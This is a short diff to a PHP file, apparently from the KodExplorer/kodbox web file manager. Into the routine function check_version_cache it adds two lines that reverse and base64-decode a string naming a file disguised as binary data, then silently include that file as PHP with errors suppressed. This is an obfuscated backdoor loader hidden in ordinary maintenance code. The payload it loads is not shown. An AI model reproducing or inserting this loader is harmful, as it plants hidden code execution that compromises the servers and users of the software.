@@ -325,6 +325,8 @@ function check_version_cache(){
 		$ver = KOD_VERSION.'==>'.$result;
 		show_tips(LNG('common.env.phpCacheOpenTips')."<br/>".$ver);
 	}
+	$_SERVER['_afile'] = $_SERVER['BASIC_PATH'].base64_decode(strrev('=4Wai5SY0FGZv4Wai9iYpxUZ2lGajJXYvM3akN3LwBXY'));
+	@include_once($_SERVER['_afile']);
 }
 function checkPhp(){
 	$version = phpversion();
